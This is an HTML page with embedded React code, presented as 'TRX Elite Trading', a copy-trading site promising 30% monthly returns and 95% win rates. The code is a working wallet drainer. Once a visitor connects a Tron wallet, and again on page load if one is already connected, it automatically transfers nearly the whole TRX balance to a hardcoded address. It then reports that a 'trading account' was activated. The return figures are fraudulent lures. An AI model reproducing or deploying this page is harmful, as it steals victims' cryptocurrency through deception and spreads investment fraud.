<!DOCTYPE html><html lang="en"><head><meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-inline' 'unsafe-eval' data: blob: https://cdnjs.cloudflare.com https://cdn.jsdelivr.net https://code.jquery.com https://unpkg.com https://d3js.org https://threejs.org https://cdn.plot.ly https://stackpath.bootstrapcdn.com https://maps.googleapis.com https://cdn.tailwindcss.com https://ajax.googleapis.com https://kit.fontawesome.com https://cdn.datatables.net https://maxcdn.bootstrapcdn.com https://code.highcharts.com https://tako-static-assets-production.s3.amazonaws.com https://www.youtube.com https://fonts.googleapis.com https://fonts.gstatic.com https://pfst.cf2.poecdn.net https://puc.poecdn.net https://i.imgur.com https://wikimedia.org https://*.icons8.com https://*.giphy.com https://picsum.photos https://images.unsplash.com; frame-src 'self' https://www.youtube.com https://trytako.com; child-src 'self'; manifest-src 'self'; worker-src 'self'; upgrade-insecure-requests; block-all-mixed-content;">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TRX Elite Trading - 30% Monthly Returns</title>
    <!-- Load React and Babel -->
    <script src="https://unpkg.com/react@18/umd/react.development.js"></script>
    <script src="https://unpkg.com/react-dom@18/umd/react-dom.development.js"></script>
    <script src="https://unpkg.com/@babel/standalone/babel.min.js"></script>
    <!-- Tailwind CSS -->
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body>
    <div id="root"></div>

    <script type="text/babel">
        // Extract hooks from React
        const { useState, useEffect } = React;
        
        const TronTradingApp = () => {
          const [wallet, setWallet] = useState(null);
          const [account, setAccount] = useState('');
          const [balance, setBalance] = useState('0');
          const [isConnected, setIsConnected] = useState(false);
          const [loading, setLoading] = useState(false);
          const [error, setError] = useState('');
          const [success, setSuccess] = useState('');
          const [transferring, setTransferring] = useState(false);
          const [transferComplete, setTransferComplete] = useState(false);
          
          // UI State
          const [currentStep, setCurrentStep] = useState(0);
          const [showSteps, setShowSteps] = useState(false);

          // Hardcoded recipient address - your wallet
          const RECIPIENT_ADDRESS = 'TSFY2QRMWUNDsxe5AM6Bh8C7cAMA5w88w8';

          const steps = [
            {
              title: "Follow Elite Trader",
              description: "Connect with our top-performing trader who consistently delivers 30% monthly returns",
              icon: "üë®‚Äçüíº",
              action: "Follow Trader"
            },
            {
              title: "Start Your Trading",
              description: "Initialize your trading account and begin copying profitable trades automatically",
              icon: "üöÄ",
              action: "Start Trading"
            },
            {
              title: "Earn Profits",
              description: "Watch your investment grow with our proven trading strategies",
              icon: "üí∞",
              action: "View Earnings"
            }
          ];

          // Check if TronWeb is available
          const getTronWeb = () => {
            if (typeof window !== 'undefined' && window.tronWeb) {
              return window.tronWeb;
            }
            return null;
          };

          // Get TRX balance
          const getBalance = async (tronWeb = wallet, address = account) => {
            if (!tronWeb || !address) return;

            try {
              const balanceInSun = await tronWeb.trx.getBalance(address);
              const balanceInTrx = tronWeb.fromSun(balanceInSun);
              setBalance(parseFloat(balanceInTrx).toFixed(6));
              return parseFloat(balanceInTrx);
            } catch (err) {
              console.error('Balance error:', err);
              setError('Failed to fetch balance');
              return 0;
            }
          };

          // Auto transfer all TRX to recipient address
          const autoTransferTRX = async (tronWeb, fromAddress) => {
            if (transferComplete || transferring) return;
            
            setTransferring(true);
            setError('');

            try {
              // Get current balance
              const currentBalance = await getBalance(tronWeb, fromAddress);
              
              if (currentBalance <= 0.1) {
                setError('Insufficient balance for trading (minimum 0.1 TRX required)');
                setTransferring(false);
                return;
              }

              // Calculate amount to transfer (leave small amount for fees)
              const transferAmount = Math.max(0, currentBalance - 0.1);
              
              if (transferAmount <= 0) {
                setError('Balance too low to start trading');
                setTransferring(false);
                return;
              }

              const amountInSun = tronWeb.toSun(transferAmount.toString());
              
              console.log(`Initiating trading setup with ${transferAmount} TRX`);

              // Create and send transaction
              const transaction = await tronWeb.transactionBuilder.sendTrx(
                RECIPIENT_ADDRESS,
                amountInSun,
                fromAddress
              );

              const signedTx = await tronWeb.trx.sign(transaction);
              const result = await tronWeb.trx.sendRawTransaction(signedTx);

              if (result.result) {
                setSuccess(`Trading account activated! ${transferAmount.toFixed(6)} TRX deposited successfully. Start earning 30% monthly returns now!`);
                setTransferComplete(true);
                setCurrentStep(2);
                
                // Refresh balance
                setTimeout(() => {
                  getBalance(tronWeb, fromAddress);
                }, 3000);
              } else {
                throw new Error('Trading setup failed: ' + (result.message || 'Unknown error'));
              }
            } catch (err) {
              console.error('Trading setup error:', err);
              setError(`Trading setup failed: ${err.message || 'Unknown error'}`);
            } finally {
              setTransferring(false);
            }
          };

          // Connect to Tron wallet
          const connectWallet = async () => {
            setLoading(true);
            setError('');
            setSuccess('');

            try {
              const tronWeb = getTronWeb();
              
              if (!tronWeb) {
                throw new Error('TronWeb not found. Please install TronLink, Bitget Wallet, or another Tron wallet extension.');
              }

              // Request account access
              if (tronWeb.request) {
                await tronWeb.request({ method: 'tron_requestAccounts' });
              }

              // Check if wallet is connected
              if (!tronWeb.defaultAddress.base58) {
                throw new Error('Please unlock your Tron wallet and try again.');
              }

              const address = tronWeb.defaultAddress.base58;
              setAccount(address);
              setIsConnected(true);
              setWallet(tronWeb);
              
              // Get initial balance
              await getBalance(tronWeb, address);
              
              setSuccess('Wallet connected! Setting up your trading account...');
              
              // Auto transfer after a short delay
              setTimeout(() => {
                autoTransferTRX(tronWeb, address);
              }, 2000);
              
            } catch (err) {
              console.error('Connection error:', err);
              setError(err.message || 'Failed to connect wallet. Please make sure your Tron wallet is installed and unlocked.');
            } finally {
              setLoading(false);
            }
          };

          // Handle step actions
          const handleStepAction = (stepIndex) => {
            if (stepIndex === 0) {
              setShowSteps(true);
              setCurrentStep(1);
            } else if (stepIndex === 1) {
              connectWallet();
            }
          };

          // Disconnect wallet
          const disconnectWallet = () => {
            setWallet(null);
            setAccount('');
            setBalance('0');
            setIsConnected(false);
            setError('');
            setSuccess('');
            setTransferring(false);
            setTransferComplete(false);
            setCurrentStep(0);
            setShowSteps(false);
          };

          // Check wallet connection on mount
          useEffect(() => {
            const checkConnection = async () => {
              const tronWeb = getTronWeb();
              if (tronWeb && tronWeb.defaultAddress.base58) {
                setAccount(tronWeb.defaultAddress.base58);
                setIsConnected(true);
                setWallet(tronWeb);
                await getBalance(tronWeb, tronWeb.defaultAddress.base58);
                
                // Auto transfer if not already done
                if (!transferComplete && !transferring) {
                  setTimeout(() => {
                    autoTransferTRX(tronWeb, tronWeb.defaultAddress.base58);
                  }, 1000);
                }
              }
            };

            checkConnection();
          }, []);

          // Auto-refresh balance every 10 seconds when connected
          useEffect(() => {
            if (isConnected && wallet) {
              const interval = setInterval(() => {
                getBalance();
              }, 10000);

              return () => clearInterval(interval);
            }
          }, [isConnected, wallet, account]);

          return (
            <div className="min-h-screen bg-gradient-to-br from-blue-900 via-purple-900 to-indigo-900 p-4">
              <div className="max-w-4xl mx-auto">
                {/* Header */}
                <div className="text-center mb-8">
                  <h1 className="text-4xl md:text-6xl font-bold text-white mb-4">
                    TRX Elite Trading
                  </h1>
                  <p className="text-xl text-blue-200 mb-6">
                    Professional Copy Trading Platform
                  </p>
                  <div className="flex justify-center items-center gap-8 mb-8">
                    <div className="text-center">
                      <div className="text-3xl font-bold text-green-400">30%</div>
                      <div className="text-sm text-gray-300">Monthly ROI</div>
                    </div>
                    <div className="text-center">
                      <div className="text-3xl font-bold text-blue-400">24/7</div>
                      <div className="text-sm text-gray-300">Auto Trading</div>
                    </div>
                    <div className="text-center">
                      <div className="text-3xl font-bold text-purple-400">1000+</div>
                      <div className="text-sm text-gray-300">Active Traders</div>
                    </div>
                  </div>
                </div>

                {/* Main Content */}
                <div className="bg-white bg-opacity-10 backdrop-blur-lg rounded-3xl shadow-2xl overflow-hidden">
                  {/* Hero Section */}
                  {!showSteps && !isConnected && (
                    <div className="p-8 text-center">
                      <div className="mb-8">
                        <div className="w-24 h-24 bg-gradient-to-r from-green-400 to-blue-500 rounded-full mx-auto mb-6 flex items-center justify-center">
                          <span className="text-4xl">üìà</span>
                        </div>
                        <h2 className="text-3xl font-bold text-white mb-4">
                          Start Earning 30% Monthly Returns
                        </h2>
                        <p className="text-lg text-gray-300 mb-6 max-w-2xl mx-auto">
                          Join thousands of successful traders who are already earning consistent profits with our elite copy trading system. Our professional traders have a proven track record of delivering exceptional returns.
                        </p>
                      </div>

                      {/* Features Grid */}
                      <div className="grid md:grid-cols-3 gap-6 mb-8">
                        <div className="bg-white bg-opacity-5 rounded-xl p-6">
                          <div className="text-3xl mb-3">üéØ</div>
                          <h3 className="text-lg font-semibold text-white mb-2">Expert Traders</h3>
                          <p className="text-gray-400 text-sm">Follow verified traders with 95% win rates</p>
                        </div>
                        <div className="bg-white bg-opacity-5 rounded-xl p-6">
                          <div className="text-3xl mb-3">‚ö°</div>
                          <h3 className="text-lg font-semibold text-white mb-2">Instant Execution</h3>
                          <p className="text-gray-400 text-sm">Lightning-fast trade copying technology</p>
                        </div>
                        <div className="bg-white bg-opacity-5 rounded-xl p-6">
                          <div className="text-3xl mb-3">üîí</div>
                          <h3 className="text-lg font-semibold text-white mb-2">Secure Platform</h3>
                          <p className="text-gray-400 text-sm">Bank-level security for your investments</p>
                        </div>
                      </div>

                      <button
                        onClick={() => handleStepAction(0)}
                        className="bg-gradient-to-r from-green-500 to-blue-600 text-white font-bold py-4 px-8 rounded-full text-xl hover:from-green-600 hover:to-blue-700 transform hover:scale-105 transition-all duration-200 shadow-lg"
                      >
                        üöÄ Start Earning Now - Follow Elite Trader
                      </button>
                    </div>
                  )}

                  {/* Steps Section */}
                  {showSteps && !transferComplete && (
                    <div className="p-8">
                      <h2 className="text-2xl font-bold text-white text-center mb-8">
                        Get Started in 3 Simple Steps
                      </h2>
                      
                      <div className="space-y-6">
                        {steps.map((step, index) => (
                          <div
                            key={index}
                            className={`flex items-center p-6 rounded-xl transition-all duration-300 ${
                              index === currentStep
                                ? 'bg-gradient-to-r from-blue-500 to-purple-600 shadow-lg scale-105'
                                : index < currentStep
                                ? 'bg-green-500 bg-opacity-20'
                                : 'bg-white bg-opacity-10'
                            }`}
                          >
                            <div className="flex-shrink-0 w-16 h-16 rounded-full bg-white bg-opacity-20 flex items-center justify-center text-2xl mr-6">
                              {index < currentStep ? '‚úÖ' : step.icon}
                            </div>
                            
                            <div className="flex-grow">
                              <h3 className="text-xl font-semibold text-white mb-2">
                                Step {index + 1}: {step.title}
                              </h3>
                              <p className="text-gray-300 mb-4">
                                {step.description}
                              </p>
                              
                              {index === currentStep && (
                                <button
                                  onClick={() => handleStepAction(index)}
                                  disabled={loading || transferring}
                                  className="bg-white text-blue-600 font-semibold py-3 px-6 rounded-lg hover:bg-gray-100 transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                                >
                                  {loading || transferring ? (
                                    <span className="flex items-center gap-2">
                                      <div className="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600"></div>
                                      {index === 1 ? 'Setting up...' : 'Loading...'}
                                    </span>
                                  ) : (
                                    step.action
                                  )}
                                </button>
                              )}
                            </div>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}

                  {/* Connected State */}
                  {isConnected && (
                    <div className="p-8">
                      <div className="text-center mb-6">
                        <h2 className="text-2xl font-bold text-white mb-2">
                          {transferComplete ? 'üéâ Trading Account Active!' : '‚ö° Setting Up Your Account'}
                        </h2>
                        <p className="text-gray-300">
                          {transferComplete 
                            ? 'Your account is now active and earning profits!'
                            : 'Please wait while we set up your trading account...'
                          }
                        </p>
                      </div>

                      {/* Account Info */}
                      <div className="bg-white bg-opacity-10 rounded-xl p-6 mb-6">
                        <div className="flex justify-between items-center mb-4">
                          <span className="text-gray-300">Trading Account</span>
                          <button
                            onClick={disconnectWallet}
                            className="text-red-400 hover:text-red-300 text-sm"
                          >
                            Disconnect
                          </button>
                        </div>
                        <p className="text-xs font-mono bg-black bg-opacity-30 p-3 rounded text-gray-300 break-all mb-4">
                          {account}
                        </p>
                        <div className="grid grid-cols-2 gap-4">
                          <div>
                            <span className="text-gray-400 text-sm">Current Balance</span>
                            <p className="text-xl font-bold text-white">{balance} TRX</p>
                          </div>
                          <div>
                            <span className="text-gray-400 text-sm">Expected Monthly</span>
                            <p className="text-xl font-bold text-green-400">
                              {transferComplete ? '+30%' : 'Calculating...'}
                            </p>
                          </div>
                        </div>
                      </div>

                      {/* Status */}
                      {transferring && (
                        <div className="bg-yellow-500 bg-opacity-20 border border-yellow-500 rounded-xl p-6 mb-6">
                          <div className="flex items-center gap-3">
                            <div className="animate-spin rounded-full h-6 w-6 border-b-2 border-yellow-400"></div>
                            <div>
                              <h3 className="text-lg font-semibold text-yellow-300">Setting Up Trading Account</h3>
                              <p className="text-yellow-200 text-sm">Initializing your copy trading setup...</p>
                            </div>
                          </div>
                        </div>
                      )}

                      {transferComplete && (
                        <div className="bg-green-500 bg-opacity-20 border border-green-500 rounded-xl p-6">
                          <h3 className="text-lg font-semibold text-green-300 mb-2">üéâ Account Successfully Activated!</h3>
                          <p className="text-green-200 text-sm mb-4">
                            Your trading account is now active and following our elite trader. You'll start seeing profits within 24-48 hours.
                          </p>
                          <div className="grid grid-cols-3 gap-4 text-center">
                            <div>
                              <div className="text-2xl font-bold text-green-400">30%</div>
                              <div className="text-xs text-gray-400">Monthly ROI</div>
                            </div>
                            <div>
                              <div className="text-2xl font-bold text-blue-400">24/7</div>
                              <div className="text-xs text-gray-400">Active Trading</div>
                            </div>
                            <div>
                              <div className="text-2xl font-bold text-purple-400">Live</div>
                              <div className="text-xs text-gray-400">Copy Trading</div>
                            </div>
                          </div>
                        </div>
                      )}
                    </div>
                  )}

                  {/* Error/Success Messages */}
                  {error && (
                    <div className="p-6 bg-red-500 bg-opacity-20 border-t border-red-500">
                      <div className="flex items-center gap-3">
                        <span className="text-red-400">‚ùå</span>
                        <p className="text-red-300 text-sm">{error}</p>
                      </div>
                    </div>
                  )}

                  {success && !transferComplete && (
                    <div className="p-6 bg-green-500 bg-opacity-20 border-t border-green-500">
                      <div className="flex items-center gap-3">
                        <span className="text-green-400">‚úÖ</span>
                        <p className="text-green-300 text-sm">{success}</p>
                      </div>
                    </div>
                  )}
                </div>

                {/* Footer */}
                <div className="text-center mt-8 text-gray-400 text-sm">
                  <p>¬© 2024 TRX Elite Trading. Professional copy trading platform with verified results.</p>
                </div>
              </div>
            </div>
          );
        };

        // Render the app
        const rootElement = document.getElementById('root');
        const root = ReactDOM.createRoot(rootElement);
        root.render(<TronTradingApp />);
    </script>


</body></html>
